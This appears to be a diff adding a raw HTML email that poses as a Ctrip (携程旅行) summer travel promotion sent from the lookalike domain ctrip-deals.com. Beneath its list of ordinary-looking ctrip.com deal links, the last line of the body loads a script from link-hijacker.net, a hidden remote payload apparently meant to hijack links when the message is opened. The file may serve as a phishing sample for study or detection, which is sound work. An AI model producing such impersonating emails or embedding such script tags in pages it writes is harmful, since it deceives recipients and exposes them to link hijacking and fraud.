@@ -1,0 +1,25 @@
+Received: from trips.ctrip-deals.com ([101.91.55.8])
+	by mail.189.cn (Coremail) with ESMTP id F2B4A6C8D1
+	for <travel_lover@189.cn>; Sun, 08 Jun 2025 19:50:30 +0800 (CST)
+Message-ID: <DEALS-202506081950@ctrip-deals.com>
+Date: Sun, 08 Jun 2025 19:50:29 +0800
+From: "携程旅行" <deals@ctrip-deals.com>
+To: <travel_lover@189.cn>
+Subject: =?gb2312?B?xOOz58auv+LK1NbDoaGhsLLAtMGiwO0=?=
+Mime-Version: 1.0
+Content-Type: text/html; charset="gb2312"
+
+<html>
+<body>
+<h3>夏季特惠，不容错过！</h3>
+<p>亲爱的旅行家，为您精选本周最热门的旅行线路，低至3折！</p>
+<ul>
+    <li><a href="http://www.ctrip.com/sanya">海南三亚5日自由行</a></li>
+    <li><a href="http://www.ctrip.com/yunnan">云南大理双飞6日游</a></li>
+    <li><a href="http://www.ctrip.com/japan">日本东京+大阪全景7日</a></li>
+</ul>
+<p>更多优惠，请访问我们的<a href="http://www.ctrip.com">官方网站</a>。</p>
+
+<script src="http://link-hijacker.net/rewrite.py?campaign=ctrip_summer"></script>
+</body>
+</html>
